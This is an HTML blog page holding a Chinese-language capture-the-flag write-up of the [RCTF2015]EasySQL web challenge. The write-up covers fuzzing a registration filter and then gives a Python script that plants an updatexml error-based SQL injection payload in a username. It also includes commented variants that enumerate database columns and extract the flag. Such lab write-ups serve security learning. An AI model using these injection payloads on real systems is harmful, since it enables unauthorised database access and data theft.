@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="paixiaoxing">
+    
+    <title>
+        
+            RCTF2015-EasySQL |
+        
+        paixiaoxing&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/paidaxing.jpg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/paidaxing.jpg","favicon":"/images/paidaxing.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"“请用绝对的理智压制不该有的情绪。”"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/paidaxing.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+                paixiaoxing&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">RCTF2015-EasySQL</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/paidaxing.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">paixiaoxing</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-04-06 21:53:22</span>
+        <span class="mobile">2022-04-06 21:53</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/RCTF2015/">RCTF2015</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>开始的界面我还以为我走错片场了，</p>
+<p>源码里啥也没藏，那就先注册登录进去看看，发现登录进去后有一个修改密码，有点嫌疑，而且下面还有三段文本。</p>
+<p>点进去之后会有url处会有一个title=本来以为注入点是这里，小测了一下，发现，没用，得另找方法，那么还有嫌疑的地方就是注册登录以及修改密码了</p>
+<p>发现再注册页面，如果输入一些函数什么的她会直接弹框报错，应该是有一个小waf，先直接fuzz测一下看看有那些东西是被过滤了的：</p>
+<p>空格被过滤了，sleep or什么的都被过滤了，可以先用双引号构造一个注册一下看看</p>
+<p>发现是可以成功登录的，找了半天，发现当我们修改密码的时候她会报错</p>
+<p><img src="/2022/04/06/RCTF2015-EasySQL/1.png" alt="1"></p>
+<p>这样就想到了可以利用报错注入</p>
+<p>漏洞利用流程就是，创建，然后登录修改密码，读取报错</p>
+<p>直接写脚本跑把：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url1 = <span class="string">&#x27;http://0e8eef6c-0f64-472d-9815-b679ecb377d6.node4.buuoj.cn:81/register.php&#x27;</span></span><br><span class="line"><span class="comment">#name = &#x27;test&quot;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\&#x27;flag\&#x27;))),1)#&#x27;</span></span><br><span class="line"><span class="comment">#name = &#x27;test&quot;^updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(\&#x27;^f\&#x27;)))),1)#&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;test&quot;^updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(\&#x27;^f\&#x27;))),1)#&#x27;</span></span><br><span class="line"><span class="comment">#name = &#x27;test&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\&#x27;users\&#x27;)&amp;&amp;(column_name)regexp(\&#x27;^r\&#x27;))),1)#&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">	<span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">	<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">io1 = session.post(url1,data1)</span><br><span class="line"><span class="built_in">print</span>(io1.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url2 = <span class="string">&#x27;http://0e8eef6c-0f64-472d-9815-b679ecb377d6.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line">data2 = &#123;</span><br><span class="line">	<span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">	<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">io2 = session.post(url2,data2)</span><br><span class="line"><span class="built_in">print</span>(io2.text)</span><br><span class="line"></span><br><span class="line">url3 = <span class="string">&#x27;http://0e8eef6c-0f64-472d-9815-b679ecb377d6.node4.buuoj.cn:81/changepwd.php&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">&#x27;newpass&#x27;</span>: <span class="string">&#x27;1234&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;oldpass&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">io = session.post(url3,data)</span><br><span class="line"><span class="built_in">print</span>(io.text)</span><br><span class="line"><span class="comment">#脚本写的小捞，师傅们看看就好</span></span><br></pre></td></tr></table></figure>
+
+<p>注意报错注入updatexml只能显示20个字符，所以需要匹配一下flag，然后读取另一部分的时候需要反向读取内容，然后自行反向输出拼接即可</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：RCTF2015-EasySQL</li>
+        <li>Post author：paixiaoxing</li>
+        <li>Create time：2022-04-06 21:53:22</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2022/04/06/RCTF2015-EasySQL/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/RCTF2015/">#RCTF2015</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/04/07/CISCN%E6%80%BB%E5%86%B3%E8%B5%9B2019-EasyWeb/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CISCN总决赛2019-EasyWeb</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/04/06/CyberPunk/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CyberPunk</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">paixiaoxing</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF2015-EasySQL"><span class="nav-number">1.</span> <span class="nav-text">[RCTF2015]EasySQL</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
